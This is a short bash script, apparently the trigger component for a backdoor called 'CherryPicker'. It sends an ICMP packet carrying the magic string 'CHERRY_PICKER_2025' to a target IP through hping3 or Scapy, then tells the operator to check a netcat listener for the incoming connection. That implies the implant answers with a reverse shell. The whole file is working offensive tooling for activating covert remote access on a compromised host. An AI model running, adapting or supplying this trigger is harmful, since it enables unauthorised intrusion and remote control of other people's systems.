#!/bin/bash
# trigger.sh - Send magic ICMP packet to trigger CherryPicker

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <target_ip>"
    echo "Example: $0 192.168.1.50"
    exit 1
fi

TARGET=$1
MAGIC="CHERRY_PICKER_2025"

echo "[*] Sending magic ping to $TARGET"
echo "[*] Magic signature: $MAGIC"

# Check if hping3 is available
if command -v hping3 &> /dev/null; then
    echo "[*] Using hping3..."
    sudo hping3 --icmp -c 1 --data ${#MAGIC} --sign "$MAGIC" $TARGET
elif command -v python3 &> /dev/null; then
    echo "[*] Using Python/Scapy..."
    sudo python3 << EOF
try:
    from scapy.all import IP, ICMP, Raw, send
    packet = IP(dst='$TARGET')/ICMP()/Raw(load='$MAGIC')
    send(packet, verbose=False)
    print("[+] Magic ping sent successfully")
except ImportError:
    print("[!] Scapy not installed. Install with: pip3 install scapy")
    exit(1)
except Exception as e:
    print(f"[!] Error: {e}")
    exit(1)
EOF
else
    echo "[!] Neither hping3 nor python3/scapy found"
    echo "[!] Install one of:"
    echo "    - hping3: apt-get install hping3 (Linux) or brew install hping (macOS)"
    echo "    - scapy: pip3 install scapy"
    exit 1
fi

echo "[*] Done. Check your netcat listener for incoming connection."
